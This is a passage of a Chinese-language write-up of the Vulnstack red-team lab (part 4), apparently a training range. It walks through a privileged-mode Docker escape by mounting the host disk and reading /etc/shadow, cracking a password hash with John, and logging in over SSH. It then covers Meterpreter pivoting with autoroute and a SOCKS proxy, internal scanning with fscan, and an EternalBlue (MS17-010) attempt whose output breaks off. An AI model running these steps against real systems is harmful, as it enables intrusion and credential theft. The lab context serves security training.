alt=\"image.png\"></p>\n</li>\n<li>\n<p>然后通过上边一样的方法反弹<code>shell</code>即可</p>\n</li>\n</ol>\n<h2>信息收集</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-c\"><span class=\"hljs-meta\"># id</span>\nuid=<span class=\"hljs-number\">0</span>(root) gid=<span class=\"hljs-number\">0</span>(root) groups=<span class=\"hljs-number\">0</span>(root)\n<span class=\"hljs-meta\"># whoami</span>\nroot\n<span class=\"hljs-meta\"># uname -a</span>\nLinux <span class=\"hljs-number\">174745108f</span>cb <span class=\"hljs-number\">4.4</span>.<span class=\"hljs-number\">0</span><span class=\"hljs-number\">-142</span>-generic #<span class=\"hljs-number\">168</span>~<span class=\"hljs-number\">14.04</span>.<span class=\"hljs-number\">1</span>-Ubuntu SMP Sat Jan <span class=\"hljs-number\">19</span> <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">28</span> UTC <span class=\"hljs-number\">2019</span> x86_64 GNU/Linux\n</code></pre>\n<p>直接就是<code>root</code>权限？</p>\n</li>\n<li>\n<p>判断是否是<code>Docker</code>环境</p>\n<pre><code class=\"hljs language-c\">meterpreter > run post/linux/gather/checkcontainer \n\n[+] This appears to be a <span class=\"hljs-string\">'Docker'</span> container\n</code></pre>\n<p>似乎这是一个<code>Docker</code>容器，再看根目录下是否存在<code>.dockerenv</code>文件</p>\n<pre><code class=\"hljs language-c\">cd /\npwd\n/\nls -al\ntotal <span class=\"hljs-number\">72</span>\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">22</span>  <span class=\"hljs-number\">2020</span> .\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">22</span>  <span class=\"hljs-number\">2020</span> ..\n-rwxr-xr-x   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">0</span> Jan <span class=\"hljs-number\">22</span>  <span class=\"hljs-number\">2020</span> .dockerenv\n</code></pre>\n<p>由此可以判断是在容器内</p>\n</li>\n</ol>\n<h2>Docker逃逸</h2>\n<blockquote>\n<p><a href=\"https://xz.aliyun.com/t/8558?time__1311=n4%2BxnD0DcDuD90WY4GNepDUh2YDOl9YD02L%2BiD#toc-3\">https://xz.aliyun.com/t/8558?time__1311=n4%2BxnD0DcDuD90WY4GNepDUh2YDOl9YD02L%2BiD#toc-3</a></p>\n</blockquote>\n<ol>\n<li>\n<p>想着尝试用<code>dirty cow</code>来逃逸<code>Docker</code>，但是发现内核版本不在范围内，只能寻找别的方法</p>\n</li>\n<li>\n<p>然后尝试 <strong>利用特权模式进行逃逸</strong></p>\n<blockquote>\n<p>当操作者执行docker run --privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。</p>\n</blockquote>\n<p>使用<code>fdisk -l</code>查看磁盘，无回显（现在是<code>2001</code>端口获得的<code>shell</code>）</p>\n<pre><code class=\"hljs language-c\"><span class=\"hljs-meta\"># fdisk -l</span>\n</code></pre>\n<p>使用<code>tomcat</code>获得的<code>shell</code>来查看磁盘，可以查看到</p>\n<pre><code class=\"hljs language-c\"><span class=\"hljs-meta\"># fdisk -l</span>\nDisk /dev/sda: <span class=\"hljs-number\">10</span> GiB, <span class=\"hljs-number\">10737418240</span> bytes, <span class=\"hljs-number\">20971520</span> sectors\nUnits: sectors of <span class=\"hljs-number\">1</span> * <span class=\"hljs-number\">512</span> = <span class=\"hljs-number\">512</span> bytes\nSector size (logical/physical): <span class=\"hljs-number\">512</span> bytes / <span class=\"hljs-number\">512</span> bytes\nI/O size (minimum/optimal): <span class=\"hljs-number\">512</span> bytes / <span class=\"hljs-number\">512</span> bytes\nDisklabel type: dos\nDisk identifier: <span class=\"hljs-number\">0x00063af9</span>\n\nDevice     Boot    Start      End  Sectors Size Id Type\n/dev/sda1  *        <span class=\"hljs-number\">2048</span> <span class=\"hljs-number\">16779263</span> <span class=\"hljs-number\">16777216</span>   <span class=\"hljs-number\">8</span>G <span class=\"hljs-number\">83</span> Linux\n/dev/sda2       <span class=\"hljs-number\">16781310</span> <span class=\"hljs-number\">20969471</span>  <span class=\"hljs-number\">4188162</span>   <span class=\"hljs-number\">2</span>G  <span class=\"hljs-number\">5</span> Extended\n/dev/sda5       <span class=\"hljs-number\">16781312</span> <span class=\"hljs-number\">20969471</span>  <span class=\"hljs-number\">4188160</span>   <span class=\"hljs-number\">2</span>G <span class=\"hljs-number\">82</span> Linux swap / Solaris\n</code></pre>\n<p>判断特权模式</p>\n<pre><code class=\"hljs language-c\">cat /proc/self/status | grep CapEff\n</code></pre>\n<p>特权模式启动的话，<code>CapEff</code>对应的掩码值应该为<code>0000003fffffffff</code>或者是 <code>0000001fffffffff</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image56.png\" alt=\"image.png\"></p>\n<p>创建目录，并将分区挂载到目录中</p>\n<pre><code class=\"hljs language-c\">mkdir test\nmount /dev/sda1 /test\n</code></pre>\n<p>然后已经将宿主机挂在到<code>test</code>目录下了</p>\n<pre><code class=\"hljs language-c\">ls -al /test\ntotal <span class=\"hljs-number\">120</span>\ndrwxr-xr-x  <span class=\"hljs-number\">23</span> root root  <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2020</span> .\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root  <span class=\"hljs-number\">4096</span> Dec  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">05</span>:<span class=\"hljs-number\">20</span> ..\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root  <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2020</span> bin\ndrwxr-xr-x   <span class=\"hljs-number\">3</span> root root  <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2020</span> boot\ndrwxrwxr-x   <span class=\"hljs-number\">2</span> root root  <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2020</span> cdrom\ndrwxr-xr-x   <span class=\"hljs-number\">4</span> root root  <span class=\"hljs-number\">4096</span> Mar  <span class=\"hljs-number\">4</span>  <span class=\"hljs-number\">2019</span> dev\ndrwxr-xr-x <span class=\"hljs-number\">130</span> root root <span class=\"hljs-number\">12288</span> Dec  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">04</span>:<span class=\"hljs-number\">57</span> etc\ndrwxr-xr-x   <span class=\"hljs-number\">3</span> root root  <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2020</span> home\nlrwxrwxrwx   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">33</span> Jan <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2020</span> initrd.img -> boot/initrd.img<span class=\"hljs-number\">-4.4</span>.<span class=\"hljs-number\">0</span><span class=\"hljs-number\">-142</span>-generic\ndrwxr-xr-x  <span class=\"hljs-number\">23</span> root root  <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2020</span> lib\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root  <span class=\"hljs-number\">4096</span> Mar  <span class=\"hljs-number\">4</span>  <span class=\"hljs-number\">2019</span> lib64\ndrwx------   <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">16384</span> Jan <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2020</span> lost+found\ndrwxr-xr-x   <span class=\"hljs-number\">3</span> root root  <span class=\"hljs-number\">4096</span> Mar  <span class=\"hljs-number\">4</span>  <span class=\"hljs-number\">2019</span> media\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root  <span class=\"hljs-number\">4096</span> Apr <span class=\"hljs-number\">10</span>  <span class=\"hljs-number\">2014</span> mnt\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root  <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2020</span> opt\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root  <span class=\"hljs-number\">4096</span> Apr <span class=\"hljs-number\">10</span>  <span class=\"hljs-number\">2014</span> proc\ndrwx------   <span class=\"hljs-number\">2</span> root root  <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">21</span>  <span class=\"hljs-number\">2020</span> root\ndrwxr-xr-x  <span class=\"hljs-number\">12</span> root root  <span class=\"hljs-number\">4096</span> Mar  <span class=\"hljs-number\">4</span>  <span class=\"hljs-number\">2019</span> run\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">12288</span> Jan <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2020</span> sbin\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root  <span class=\"hljs-number\">4096</span> Mar  <span class=\"hljs-number\">4</span>  <span class=\"hljs-number\">2019</span> srv\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root  <span class=\"hljs-number\">4096</span> Mar <span class=\"hljs-number\">13</span>  <span class=\"hljs-number\">2014</span> sys\ndrwxrwxrwt   <span class=\"hljs-number\">5</span> root root  <span class=\"hljs-number\">4096</span> Dec  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">05</span>:<span class=\"hljs-number\">17</span> tmp\ndrwxr-xr-x  <span class=\"hljs-number\">10</span> root root  <span class=\"hljs-number\">4096</span> Mar  <span class=\"hljs-number\">4</span>  <span class=\"hljs-number\">2019</span> usr\ndrwxr-xr-x  <span class=\"hljs-number\">13</span> root root  <span class=\"hljs-number\">4096</span> Mar  <span class=\"hljs-number\">4</span>  <span class=\"hljs-number\">2019</span> var\nlrwxrwxrwx   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">30</span> Jan <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2020</span> vmlinuz -> boot/vmlinuz<span class=\"hljs-number\">-4.4</span>.<span class=\"hljs-number\">0</span><span class=\"hljs-number\">-142</span>-generic\n</code></pre>\n</li>\n<li>\n<p>查看<code>shadow</code>文件，仅能看到<code>ubuntu</code>用户有密码</p>\n<pre><code class=\"hljs language-c\">cat /test/etc/shadow \nubuntu:$<span class=\"hljs-number\">1</span>$xJbww$Yknw8dsfh25t02/g2fM9g/:<span class=\"hljs-number\">18281</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n</code></pre>\n</li>\n<li>\n<p>拿到开膛手破解</p>\n<pre><code class=\"hljs language-c\">john pass.txt                                        \nWarning: detected hash type <span class=\"hljs-string\">\"md5crypt\"</span>, but the <span class=\"hljs-built_in\">string</span> is also recognized as <span class=\"hljs-string\">\"md5crypt-long\"</span>\nUse the <span class=\"hljs-string\">\"--format=md5crypt-long\"</span> option to force loading these as that type instead\nUsing <span class=\"hljs-keyword\">default</span> input encoding: UTF<span class=\"hljs-number\">-8</span>\nLoaded <span class=\"hljs-number\">1</span> password <span class=\"hljs-title function_\">hash</span> <span class=\"hljs-params\">(md5crypt, crypt(<span class=\"hljs-number\">3</span>) $<span class=\"hljs-number\">1</span>$ (and variants) [MD5 <span class=\"hljs-number\">256</span>/<span class=\"hljs-number\">256</span> AVX2 <span class=\"hljs-number\">8</span>x3])</span>\nWill run 8 OpenMP threads\nProceeding with single, rules:Single\nPress 'q' or Ctrl-C to <span class=\"hljs-built_in\">abort</span>, almost any other key <span class=\"hljs-keyword\">for</span> status\n<span class=\"hljs-title function_\">ubuntu</span>           <span class=\"hljs-params\">(ubuntu)</span>     \n1g 0:00:00:00 DONE 1/3 <span class=\"hljs-params\">(<span class=\"hljs-number\">2024</span><span class=\"hljs-number\">-12</span><span class=\"hljs-number\">-03</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">24</span>)</span> 33.33g/s 6400p/s 6400c/s 6400C/s ubuntu..ubuntut\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>破解出密码 <code>ubuntu</code></p>\n</li>\n<li>\n<p>尝试登陆SSH</p>\n<pre><code class=\"hljs language-c\">ssh ubuntu@<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">157.128</span> \nubuntu@<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">157.128'</span>s password: \nWelcome to Ubuntu <span class=\"hljs-number\">14.04</span>.<span class=\"hljs-number\">6</span> LTS (GNU/Linux <span class=\"hljs-number\">4.4</span>.<span class=\"hljs-number\">0</span><span class=\"hljs-number\">-142</span>-generic x86_64)\n\n * Documentation:  https:<span class=\"hljs-comment\">//help.ubuntu.com/</span>\n\nYour Hardware Enablement <span class=\"hljs-title function_\">Stack</span> <span class=\"hljs-params\">(HWE)</span> is supported until April 2019.\nLast login: Thu Jan 23 20:50:17 2020 from 192.168.157.128\nubuntu@ubuntu:~$ \n</code></pre>\n<p>成功进入，查看IP信息等</p>\n<pre><code class=\"hljs language-c\">ubuntu@ubuntu:~$ ip add  \n<span class=\"hljs-number\">2</span>: eth0: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state UP group <span class=\"hljs-keyword\">default</span> qlen <span class=\"hljs-number\">1000</span>                                                                                                             \n    link/ether <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>c:<span class=\"hljs-number\">29</span>:b6:<span class=\"hljs-number\">47</span>:<span class=\"hljs-number\">4</span>a brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">157.128</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">157.255</span> scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 fe80::<span class=\"hljs-number\">20</span>c:<span class=\"hljs-number\">29f</span>f:feb6:<span class=\"hljs-number\">474</span>a/<span class=\"hljs-number\">64</span> scope link                                                                                                                                                                  \n       valid_lft forever preferred_lft forever                                                           \n<span class=\"hljs-number\">3</span>: eth1: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state UP group <span class=\"hljs-keyword\">default</span> qlen <span class=\"hljs-number\">1000</span>\n    link/ether <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>c:<span class=\"hljs-number\">29</span>:b6:<span class=\"hljs-number\">47</span>:<span class=\"hljs-number\">54</span> brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.129</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.255</span> scope global eth1                                                                                                                                                 \n       valid_lft forever preferred_lft forever                                                           \n    inet6 fe80::<span class=\"hljs-number\">20</span>c:<span class=\"hljs-number\">29f</span>f:feb6:<span class=\"hljs-number\">4754</span>/<span class=\"hljs-number\">64</span> scope link  \n       valid_lft forever preferred_lft forever\n</code></pre>\n<p>可以发现逃逸了<code>docker</code>环境，并且内网网段是<code>192.168.183.0</code></p>\n</li>\n</ol>\n<h2>内网信息收集</h2>\n<ol>\n<li>\n<p>查看<code>ubuntu</code>用户权限</p>\n<pre><code class=\"hljs language-c\">ubuntu@ubuntu:~$ sudo -i\n[sudo] password <span class=\"hljs-keyword\">for</span> ubuntu: \nroot@ubuntu:~# \n</code></pre>\n<p>直接到<code>root</code>用户了，成功拿到<code>web</code>主机的最高权限</p>\n</li>\n<li>\n<p>将其上线MSF（和上面的方法一样）</p>\n<pre><code class=\"hljs language-c\">msf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > run\n\n[*] Started reverse TCP handler on 192.168.157.129:4445 \n[*] Sending <span class=\"hljs-title function_\">stage</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">3045380</span> bytes)</span> to 192.168.157.128\n[*] Meterpreter session 2 <span class=\"hljs-title function_\">opened</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">157.129</span>:<span class=\"hljs-number\">4445</span> -> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">157.128</span>:<span class=\"hljs-number\">37052</span>)</span> at 2024-12-03 13:29:59 +0800\n\nmeterpreter > \n</code></pre>\n</li>\n<li>\n<p>首先将设置通向内网的路由，然后设置代理（方便后面使用）</p>\n<p>添加路由</p>\n<pre><code class=\"hljs language-c\">meterpreter > run post/multi/manage/autoroute \n\n[*] Running module against <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">157.128</span>\n[*] Searching <span class=\"hljs-keyword\">for</span> subnets to autoroute.\n[+] Route added to subnet <span class=\"hljs-number\">172.17</span>.<span class=\"hljs-number\">0.0</span>/<span class=\"hljs-number\">255.255</span>.<span class=\"hljs-number\">0.0</span> from host<span class=\"hljs-string\">'s routing table.\n[+] Route added to subnet 172.18.0.0/255.255.0.0 from host'</span>s routing table.\n[+] Route added to subnet <span class=\"hljs-number\">172.19</span>.<span class=\"hljs-number\">0.0</span>/<span class=\"hljs-number\">255.255</span>.<span class=\"hljs-number\">0.0</span> from host<span class=\"hljs-string\">'s routing table.\n[+] Route added to subnet 172.20.0.0/255.255.0.0 from host'</span>s routing table.\n[+] Route added to subnet <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">157.0</span>/<span class=\"hljs-number\">255.255</span>.<span class=\"hljs-number\">255.0</span> from host<span class=\"hljs-string\">'s routing table.\n[+] Route added to subnet 192.168.183.0/255.255.255.0 from host'</span>s routing table.\n</code></pre>\n<p>然后设置代理</p>\n<pre><code class=\"hljs language-c\">meterpreter > bg\n[*] Backgrounding session <span class=\"hljs-number\">2</span>\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > use auxiliary/server/socks_proxy \nmsf6 <span class=\"hljs-title function_\">auxiliary</span><span class=\"hljs-params\">(server/socks_proxy)</span> > <span class=\"hljs-built_in\">set</span> version 4a\nmsf6 <span class=\"hljs-title function_\">auxiliary</span><span class=\"hljs-params\">(server/socks_proxy)</span> > run\n[*] Auxiliary module running as background job 0.\n</code></pre>\n<p>然后配置<code>chainproxy4</code>的配置文件</p>\n<pre><code class=\"hljs language-c\"><span class=\"hljs-meta\"># vim /etc/proxychains4.conf  </span>\nsocks4  <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>       <span class=\"hljs-number\">1080</span>   \n</code></pre>\n<p>测试一下，我们知道<code>web</code>主机内网地址是<code>192.168.183.129</code> ，使用<code>curl</code>成功回显</p>\n<pre><code class=\"hljs language-c\">proxychains curl <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.129</span>:<span class=\"hljs-number\">2001</span>                                                                \n[proxychains] config file found: /etc/proxychains4.conf                                                  \n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.<span class=\"hljs-number\">4</span>                                   \n[proxychains] DLL init: proxychains-ng <span class=\"hljs-number\">4.17</span>                                                              \n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>:<span class=\"hljs-number\">1080</span>  ...  <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.129</span>:<span class=\"hljs-number\">2001</span>  ...  OK                      \n\n&#x3C;html>                                              \n&#x3C;head>                                              \n   &#x3C;title>Struts2 Showcase - Fileupload sample&#x3C;/title>                                                   \n&#x3C;/head>                                                                       \n</code></pre>\n</li>\n<li>\n<p>使用<code>fscan</code>扫描内网信息</p>\n<ul>\n<li>\n<p>将<code>fscan</code> 上传到<code>ubuntu</code></p>\n</li>\n<li>\n<p>靶机运行<code>fscan</code>将结果保存到<code>1.txt</code></p>\n<pre><code class=\"hljs language-c\">./fscan -h <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.1</span>/<span class=\"hljs-number\">24</span> > <span class=\"hljs-number\">1.</span>txt\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>扫描完毕后查看<code>1.txt</code>结果</p>\n<ul>\n<li>\n<p>存活主机，除了<code>web</code>主机内网还有两台</p>\n<pre><code class=\"hljs language-c\">(icmp) Target <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.129</span> is <span class=\"hljs-title function_\">alive</span>   \n<span class=\"hljs-params\">(icmp)</span> Target 192.168.183.130 is <span class=\"hljs-title function_\">alive</span>  \n<span class=\"hljs-params\">(icmp)</span> Target 192.168.183.131 is alive\n</code></pre>\n</li>\n<li>\n<p>端口扫描</p>\n<pre><code class=\"hljs language-c\"><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>:<span class=\"hljs-number\">445</span> open\n<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>:<span class=\"hljs-number\">139</span> open  \n<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>:<span class=\"hljs-number\">135</span> open \n<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>:<span class=\"hljs-number\">88</span> open  \n\n<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> open\n<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">139</span> open\n<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">135</span> open  \n\n<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.129</span>:<span class=\"hljs-number\">22</span> open \n</code></pre>\n<p><code>130</code>开启了<code>88</code>端口，是<code>kerberos</code>服务端口，可能是域控，并且都开启了<code>445</code>端口</p>\n</li>\n<li>\n<p>vulscan</p>\n<pre><code class=\"hljs language-c\">[*] NetInfo                                         \n[*]<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>                                  \n   [->]TESTWIN7-PC\n   [->]<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>                              \n[*] NetBios <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.1</span>   WORKGROUP\\DESKTOP-OO4DPSM \n[*] NetInfo                                      \n[*]<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>                                  \n   [->]WIN-ENS2VR5TR3N                              \n   [->]<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>                              \n[*] NetBios <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span> [+] DC:WIN-ENS2VR5TR3N.demo.com      Windows Server <span class=\"hljs-number\">2008</span> HPC Edition <span class=\"hljs-number\">7601</span> Service Pack <span class=\"hljs-number\">1</span>\n[+] MS17<span class=\"hljs-number\">-010</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>    (Windows <span class=\"hljs-number\">7</span> Enterprise <span class=\"hljs-number\">7601</span> Service Pack <span class=\"hljs-number\">1</span>) \n[+] MS17<span class=\"hljs-number\">-010</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>    (Windows Server <span class=\"hljs-number\">2008</span> HPC Edition <span class=\"hljs-number\">7601</span> Service Pack <span class=\"hljs-number\">1</span>)\n</code></pre>\n<p>和上面猜测的一样，<code>130</code>是<code>DC</code>，域名是<code>demo.com</code> ,并且两台主机都扫描出了可能存在<code>MS17-010</code></p>\n</li>\n</ul>\n</li>\n</ol>\n<h2>内网渗透</h2>\n<h3>MS17-010</h3>\n<ol>\n<li>尝试<code>MS17-010</code>\n<ul>\n<li>\n<p><code>TESTWIN7-PC</code> <code>192.168.183.131</code> (概率低的令人发指)，可能是代理问题</p>\n<pre><code class=\"hljs language-c\">msf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/ms17_010_eternalblue)</span> > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/ms17_010_eternalblue)</span> > <span class=\"hljs-built_in\">set</span> rhosts 192.168.183.131\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/ms17_010_eternalblue)</span> > <span class=\"hljs-built_in\">set</span> payload windows/meterpreter/bind_tcp\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/ms17_010_eternalblue)</span> > <span class=\"hljs-built_in\">set</span> AutoRunScript post/windows/manage/migrate\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/ms17_010_eternalblue)</span> > run\n\n[*] 192.168.183.131:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n[+] 192.168.183.131:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 Service Pack 1 <span class=\"hljs-title function_\">x64</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">64</span>-bit)</span>\n[*] 192.168.183.131:445   - Scanned 1 of 1 <span class=\"hljs-title function_\">hosts</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">100</span>% complete)</span>\n[+] 192.168.183.131:445 - The target is vulnerable.                                                      \n[*] 192.168.183.131:445 - Connecting to target <span class=\"hljs-keyword\">for</span> exploitation.\n[+] 192.168.183.131:445 - Connection established <span class=\"hljs-keyword\">for</span> exploitation.\n[+] 192.168.183.131:445 - Target OS selected valid <span class=\"hljs-keyword\">for</span> OS indicated by SMB reply\n[*] 192.168.183.131:445 - CORE raw buffer <span class=\"hljs-title function_\">dump</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">40</span> bytes)</span>\n[*] 192.168.183.131:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 45 6e 74 65 72 70  Windows 7 Enterp\n[*] 192.168.183.131:445 - 0x00000010  72 69 73 65 20 37 36 30 31 20 53 65 72 76 69 63  rise 7601 Servic\n[*] 192.168.183.131:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        \n[+] 192.168.183.131:445 - Target arch selected valid <span class=\"hljs-keyword\">for</span> arch indicated by DCE/RPC reply\n[*] 192.168.183.131:445 - Trying exploit with 12 Groom Allocations.\n[*] 192.168.183.131:445 - Sending all but last fragment of exploit packet\n[*] 192.168.183.131:445 - Starting non-paged pool grooming                             \n[+] 192.168.183.131:445 - Sending SMBv2 buffers                                                          \n[+] 192.168.183.131:445 - Closing SMBv1 connection creating <span class=\"hljs-built_in\">free</span> hole adjacent to SMBv2 buffer.\n[*] 192.168.183.131:445 - Sending final SMBv2 buffers。\n[*] 192.168.183.131:445 - Sending last fragment of exploit packet!\n[*] 192.168.183.131:445 - Receiving response from exploit packet\n[*] 192.168.183.131:445 - Sending last fragment of exploit packet!\n[*] 192.168.183.131:445 - Receiving response from exploit packet                                         \n[+] 192.168.183.131:445 - ETERNALBLUE overwrite completed <span class=\"hljs-title function_\">successfully</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">0xC000000D</span>)</span>!                     \n[*] 192.168.183.131:445 - Sending egg to corrupted connection.                                           \n[*] 192.168.183.131:445 - Triggering <span class=\"hljs-built_in\">free</span> of corrupted buffer.                                           \n[*] Started bind TCP handler against 192.168.183.131:6756                                        \n[-] 192.168.183.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[-] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[-] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                  \n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - Connecting to target <span class=\"hljs-keyword\">for</span> exploitation.                                         \n[+] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - Connection established <span class=\"hljs-keyword\">for</span> exploitation.                                       \n[+] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - Target OS selected valid <span class=\"hljs-keyword\">for</span> OS indicated by SMB reply                         \n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - CORE raw buffer dump (<span class=\"hljs-number\">40</span> bytes)                                                \n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - <span class=\"hljs-number\">0x00000000</span>  <span class=\"hljs-number\">57</span> <span class=\"hljs-number\">69</span> <span class=\"hljs-number\">6</span>e <span class=\"hljs-number\">64</span> <span class=\"hljs-number\">6f</span> <span class=\"hljs-number\">77</span> <span class=\"hljs-number\">73</span> <span class=\"hljs-number\">20</span> <span class=\"hljs-number\">37</span> <span class=\"hljs-number\">20</span> <span class=\"hljs-number\">45</span> <span class=\"hljs-number\">6</span>e <span class=\"hljs-number\">74</span> <span class=\"hljs-number\">65</span> <span class=\"hljs-number\">72</span> <span 